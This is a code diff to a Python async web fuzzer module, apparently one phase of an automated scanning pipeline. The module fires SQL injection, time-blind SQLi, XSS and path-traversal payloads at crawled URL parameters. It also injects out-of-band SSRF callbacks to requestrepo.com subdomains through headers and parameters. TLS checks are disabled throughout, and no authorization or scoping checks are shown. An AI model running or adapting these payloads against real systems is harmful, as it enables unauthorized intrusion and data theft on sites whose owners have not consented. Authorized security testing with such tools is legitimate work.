@@ -3,19 +3,21 @@ import aiohttp
 import logging
 import re
 import time
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
+import hashlib
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from rich.console import Console
 
 console = Console()
 log = logging.getLogger("rich")
 
 PAYLOADS = {
-    "SQLi": ["'", "1' OR '1'='1", "';--", "1\" OR \"1\"=\"1", "admin'--"],
+    "SQLi": ["'", "1' OR '1'='1", "';--"],
     "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=prompt(1)>"],
     "LFI": ["../../../../../../../../etc/passwd", "../../../../windows/win.ini"]
 }
-CHRONOS_PAYLOADS = {
-    "Time-Blind SQLi": ["1' OR SLEEP(6)--", "1); pg_sleep(6)--", "1'; WAITFOR DELAY '0:0:6'--"]
+
+CHRONOS_MATRIX = {
+    "Time-Blind SQLi": {"active": "1' OR SLEEP(6)--", "control": "1' OR SLEEP(0)--"}
 }
 
 DETECTIONS = {
@@ -24,110 +26,126 @@ DETECTIONS = {
     "LFI": re.compile(r'(root:x:0:0:|\[extensions\]|boot loader)', re.I)
 }
 
-COMMON_PARAMS = ["id", "page", "username", "email", "password", "file", "q"]
-SWAGGER_PATHS = ["/swagger.json", "/api/swagger.json", "/openapi.json", "/v2/api-docs", "/api-docs"]
+# --- THE SEMANTIC ROUTER ---
+SEMANTIC_MAP = {
+    "SQLi": ["id", "user", "uid", "cat", "sort", "page", "num"],
+    "XSS": ["q", "search", "query", "name", "keyword", "msg", "term"],
+    "LFI": ["file", "path", "template", "include", "doc", "folder"],
+    "SSRF": ["url", "uri", "redirect", "next", "domain", "callback", "host", "site"]
+}
 
-async def hunt_swagger(client, base_url, session_state):
-    parsed_base = urlparse(base_url)
-    root_url = f"{parsed_base.scheme}://{parsed_base.netloc}"
-    for path in SWAGGER_PATHS:
-        target_url = urljoin(root_url, path)
-        try:
-            async with client.get(target_url, timeout=5, ssl=False) as response:
-                if response.status == 200:
-                    data = await response.json()
-                    if 'paths' in data:
-                        console.print(f"[bold magenta]  [*] SEMANTIC BREACH: API Blueprint at {target_url}[/bold magenta]")
-                        for api_path in data.get('paths', {}).keys():
-                            session_state.add_crawled_url(urljoin(root_url, data.get('basePath', '') + api_path))
-                        return True
-        except Exception: pass
-    return False
+def classify_param(param):
+    p = param.lower()
+    targets = [vuln for vuln, keywords in SEMANTIC_MAP.items() if any(k in p for k in keywords)]
+    return targets if targets else ["SQLi", "XSS"] # Default safe heuristics if unknown
 
 async def measure_baseline(client, url):
-    """Auto-Calibrates the network latency to detect WAF Tarpits."""
     try:
         start = time.perf_counter()
-        async with client.get(url, timeout=8, ssl=False) as r:
-            await r.read()
+        async with client.get(url, timeout=8, ssl=False) as r: await r.read()
         return time.perf_counter() - start
-    except Exception:
-        return 9.0 # Assume heavy tarpit on failure
+    except Exception: return 9.0
 
 async def fuzz_endpoint(client, url, session_state):
-    vulnerabilities_found = []
+    vulnerabilities = []
     parsed = urlparse(url)
-    query_params = parse_qs(parsed.query) or {p: ["1"] for p in COMMON_PARAMS}
+    query_params = parse_qs(parsed.query)
+    if not query_params: return []
 
-    # 1. Establish Baseline Latency
+    # Setup OAST identity
+    url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
+    oast_domain = f"{url_hash}.{session_state.run_id.replace('-', '')[:8]}.requestrepo.com"
+    oast_headers = {
+        "User-Agent": f"Mozilla/5.0 ({oast_domain})",
+        "X-Forwarded-For": oast_domain,
+        "Referer": f"http://{oast_domain}"
+    }
+
+    # 1. Blind Header SSRF Injection (Always runs)
+    try:
+        async with client.get(url, headers=oast_headers, timeout=5, ssl=False) as r: pass
+    except Exception: pass
+
     baseline = await measure_baseline(client, url)
-    is_tarpitted = baseline > 4.0
 
+    # 2. Semantic Parameter Routing
     for param, values in query_params.items():
-        # Polyglot Fuzzing
-        for vuln_type, payloads in PAYLOADS.items():
-            for payload in payloads:
+        target_vulns = classify_param(param)
+
+        # Route 1: Parameter-based SSRF -> Inject OAST Token
+        if "SSRF" in target_vulns:
+            fuzzed_params = query_params.copy()
+            fuzzed_params[param] = [f"http://{oast_domain}"]
+            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
+            try:
+                async with client.get(target_url, timeout=5, ssl=False) as r: pass
+            except Exception: pass
+
+        # Route 2: Standard Reflection / Error (SQLi, XSS, LFI)
+        for vuln_type in [v for v in target_vulns if v in PAYLOADS]:
+            for payload in PAYLOADS[vuln_type]:
                 fuzzed_params = query_params.copy()
                 fuzzed_params[param] = [payload]
                 target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
-                json_payload = {p: payload if p == param else "test" for p in query_params.keys()}
-
                 try:
-                    async with client.get(target_url, timeout=5, ssl=False) as r_get:
-                        if DETECTIONS[vuln_type].search(await r_get.text()):
-                            console.print(f"[red]  ! [HIGH] {vuln_type} via GET on {url}[/red]")
-                            vulnerabilities_found.append({"type": "VULN", "name": f"GET {vuln_type}", "matched-at": url, "info": {"severity": "HIGH"}})
-                            break 
-                    async with client.post(url, json=json_payload, headers={"Content-Type": "application/json"}, timeout=5, ssl=False) as r_post:
-                        if DETECTIONS[vuln_type].search(await r_post.text()):
-                            console.print(f"[red]  ! [HIGH] {vuln_type} via POST on {url}[/red]")
-                            vulnerabilities_found.append({"type": "VULN", "name": f"POST {vuln_type}", "matched-at": url, "info": {"severity": "HIGH"}})
+                    async with client.get(target_url, timeout=5, ssl=False) as r:
+                        if DETECTIONS[vuln_type].search(await r.text()):
+                            console.print(f"[red]  ! [HIGH] {vuln_type} matched on ?{param}=...[/red]")
+                            vulnerabilities.append({"type": "VULN", "name": f"GET {vuln_type}", "matched-at": target_url, "info": {"severity": "HIGH"}})
                             break
                 except Exception: pass
 
-        # Chronos Temporal Fuzzing (Protected by Auto-Calibration)
-        if is_tarpitted:
-            continue # Skip temporal fuzzing to prevent WAF false positives
-
-        for vuln_type, payloads in CHRONOS_PAYLOADS.items():
-            for payload in payloads:
+        # Route 3: Chronos Double-Blind (Only if SQLi is semantically relevant)
+        if "SQLi" in target_vulns and baseline <= 4.0:
+            for vuln_type, matrix in CHRONOS_MATRIX.items():
                 fuzzed_params = query_params.copy()
-                fuzzed_params[param] = [payload]
-                target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
-                chronos_timeout = aiohttp.ClientTimeout(total=12) 
-                
-                # Dynamic Threshold: Must be 5 seconds slower than the normal baseline
-                threshold = baseline + 5.0 
 
+                fuzzed_params[param] = [matrix["active"]]
+                active_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
+                active_delay = 0
                 try:
-                    start_time = time.perf_counter()
-                    async with client.get(target_url, timeout=chronos_timeout, ssl=False) as r_get:
-                        await r_get.read()
-                    if (time.perf_counter() - start_time) >= threshold:
-                        console.print(f"[red]  ! [CRITICAL] {vuln_type} via GET on {url}[/red]")
-                        vulnerabilities_found.append({"type": "VULN", "name": f"Chronos {vuln_type}", "matched-at": url, "info": {"severity": "CRITICAL"}})
-                        break
-                except asyncio.TimeoutError: pass
+                    start = time.perf_counter()
+                    async with client.get(active_url, timeout=10, ssl=False) as r: await r.read()
+                    active_delay = time.perf_counter() - start
+                except asyncio.TimeoutError: active_delay = 10.0
                 except Exception: pass
-                    
-    return vulnerabilities_found
 
-async def deploy_fuzzer(session_state, api_targets, root_hosts):
+                if active_delay >= 5.5:
+                    fuzzed_params[param] = [matrix["control"]]
+                    control_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
+                    control_delay = 0
+                    try:
+                        start = time.perf_counter()
+                        async with client.get(control_url, timeout=10, ssl=False) as r: await r.read()
+                        control_delay = time.perf_counter() - start
+                    except asyncio.TimeoutError: control_delay = 10.0
+                    except Exception: pass
+
+                    if control_delay < 3.0:
+                        console.print(f"[red]  ! [CRITICAL] {vuln_type} (Double-Blind Verified) on ?{param}=...[/red]")
+                        vulnerabilities.append({"type": "VULN", "name": f"Chronos {vuln_type}", "matched-at": active_url, "info": {"severity": "CRITICAL"}})
+
+    return vulnerabilities
+
+async def deploy_fuzzer(session_state, api_targets):
     connector = aiohttp.TCPConnector(limit=20, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as client:
-        if root_hosts:
-            await asyncio.gather(*[hunt_swagger(client, h, session_state) for h in root_hosts])
         for i in range(0, len(api_targets), 100):
             chunk = api_targets[i:i + 100]
             results = await asyncio.gather(*[fuzz_endpoint(client, t, session_state) for t in chunk])
-            for vuln_list in results:
-                if vuln_list: session_state.vulnerabilities.extend(vuln_list)
+            for v in results:
+                if v: session_state.vulnerabilities.extend(v)
 
 def run_fuzzer(session, config):
-    console.print("\n[bold blue]━━ PHASE 5: NATIVE API FUZZER (AUTO-CALIBRATED) ━━[/bold blue]")
-    root_hosts = {h['url'] if isinstance(h, dict) else h for h in session.get_live_hosts()}
-    api_targets = {u['url'] if isinstance(u, dict) else u for u in session.get_crawled_urls()}
-    api_targets = [t for t in api_targets if not re.search(r'\.(css|js|png|jpg|svg|woff2|ico)$', t, re.I)]
+    console.print("\n[bold blue]━━ PHASE 5: NATIVE API FUZZER (SEMANTIC ROUTING & OAST) ━━[/bold blue]")
+    urls = [u['url'] if isinstance(u, dict) else u for u in session.get_crawled_urls()]
     
-    if not root_hosts and not api_targets: return
-    asyncio.run(deploy_fuzzer(session, list(api_targets), list(root_hosts)))
+    # Filter strictly for URLs with query parameters, ignoring static assets
+    api_targets = [t for t in urls if '?' in t and not re.search(r'\.(css|js|png|jpg|svg|woff2|ico)(\?.*)?$', t, re.I)]
+    
+    if not api_targets:
+        console.print("WARNING  No parameterized endpoints found in State Graph. Skipping Fuzzer.")
+        return
+        
+    console.print(f"INFO     Deploying Semantic Fuzzer against {len(set(api_targets))} parameterized targets...")
+    asyncio.run(deploy_fuzzer(session, list(set(api_targets))))
